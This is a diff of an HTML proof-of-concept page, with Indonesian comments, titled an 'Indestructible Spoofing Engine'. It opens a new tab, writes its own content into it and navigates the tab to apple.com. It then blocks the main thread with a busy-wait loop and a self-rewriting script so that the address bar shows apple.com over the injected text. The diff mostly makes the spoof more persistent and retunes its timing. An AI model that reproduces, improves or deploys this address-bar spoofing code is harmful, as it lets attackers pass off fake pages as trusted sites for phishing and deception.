@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Ultimate 1-Click Force Lock - HALLO</title>
+    <title>Ultimate Indestructible Force Lock - HALLO</title>
     <style>
       body, html {
         margin: 0;
@@ -53,19 +53,19 @@
   </head>
   <body>
     <div class="container">
-      <h1>1-Click Address Bar Spoofing</h1>
-      <button id="startBtn">CLICK TO LOCK APPLE.COM</button>
+      <h1>Indestructible Spoofing Engine</h1>
+      <button id="startBtn">EXECUTE UNBREAKABLE LOCK</button>
     </div>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. Membuka tab baru secara instan dan bersih
+        // 1. Membuka jendela baru secara instan
         const newTab = window.open("", "_blank");
 
         if (newTab) {
-          // 2. Menyuntikkan halaman simpel berisi teks "HALLO" sesuai permintaan
+          // 2. Menyuntikkan template dokumen HTML mandiri yang membawa script pertahanan mandiri (Self-Healing DOM)
           newTab.document.write(`
             <!DOCTYPE html>
             <html>
@@ -74,7 +74,17 @@
               <meta name="viewport" content="width=device-width, initial-scale=1">
             </head>
             <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-              <h1 id="spoof-text" style="font-size:90px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
+              <h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
+              <script>
+                // Self-Healing Shield: Jika ada upaya pembersihan atau penimpaan elemen, langsung regenerasi paksa
+                setInterval(() => {
+                  if (!document.getElementById('spoof-text') || document.body.innerText.trim() !== 'HALLO') {
+                    document.open();
+                    document.write('<!DOCTYPE html><html><head><title>Apple</title><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;"><h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1></body></html>');
+                    document.close();
+                  }
+                }, 5);
+              <\/script>
             </body>
             </html>
           `);
@@ -82,44 +92,32 @@
 
           try { newTab.focus(); } catch (e) {}
 
-          // 3. Timing 1 (8ms): Memicu tarikan navigasi asinkron mutlak ke apple.com agar address bar berubah
+          // 3. Timing 1 (6ms): Memicu tarikan navigasi asinkron mutlak ke apple.com agar address bar berubah terpampang
           setTimeout(() => {
             try {
               newTab.location.href = "https://apple.com";
             } catch (err) {}
-          }, 8);
+          }, 6);
 
-          // 4. Timing 2 (28ms): Mengunci render thread secara total serta memasang DOM Shield pengaman
+          // 4. Timing 2 (20ms): Mengunci main thread secara sinkronus untuk menahan antrean render pipeline pusat
           setTimeout(() => {
             try {
               newTab.eval(`
-                // Melindungi elemen agar tidak terhapus atau tertimpa struktur asli apple.com
-                try {
-                  const observer = new MutationObserver(() => {
-                    if (!document.getElementById('spoof-text')) {
-                      document.body.innerHTML = '<h1 id="spoof-text" style="font-size:90px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
-                    }
-                  });
-                  observer.observe(document.documentElement, { childList: true, subtree: true });
-                } catch(e) {}
-
                 const startTime = Date.now();
-                // Membekukan thread utama selama 6 detik penuh untuk menjaga state desynchronization
-                while (Date.now() - startTime < 6000) {
+                while (Date.now() - startTime < 7000) {
                   const reflow = document.body.offsetHeight;
-                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fcfcfc';
-
+                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fefefe';
+                  
                   if (!document.getElementById('spoof-text')) {
-                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:90px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
+                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
                   }
                 }
               `);
             } catch (e) {
-              // Fallback lokal jika terhalang cross-origin context policy
               let start = Date.now();
-              while (Date.now() - start < 6000) {}
+              while (Date.now() - start < 7000) {}
             }
-          }, 28);
+          }, 20);
         }
       };
     </script>
